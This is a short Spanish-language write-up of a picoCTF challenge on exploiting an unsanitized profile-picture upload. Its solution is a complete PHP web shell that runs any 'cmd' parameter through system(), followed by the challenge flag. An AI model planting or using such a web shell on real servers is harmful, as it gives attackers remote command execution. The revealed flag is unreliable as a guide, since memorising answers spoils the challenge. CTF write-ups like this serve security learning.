## Descripción:
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.You can access the web application [here](http://standard-pizzas.picoctf.net:54024/)!

Hints:
- File upload was not sanitized
- Whenever you get a shell on a remote machine, check `sudo -l`

## Solución:
```
Cree un .php con lo siguiente:

<html>

<body>

<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">

<input type="TEXT" name="cmd" autofocus id="cmd" size="80">

<input type="SUBMIT" value="Execute">

</form>

<pre>

<?php

    if(isset($_GET['cmd']))

    {

        system($_GET['cmd'] . ' 2>&1');

    }

?>

</pre>

</body>

</html>

para ejecutar los comandos desde el navegador y no con parametros como en el reto Trickster


picoCTF{wh47_c4n_u_d0_wPHP_d698d800}
```

## Notas:
La bandera estaba en /root/flag.txt

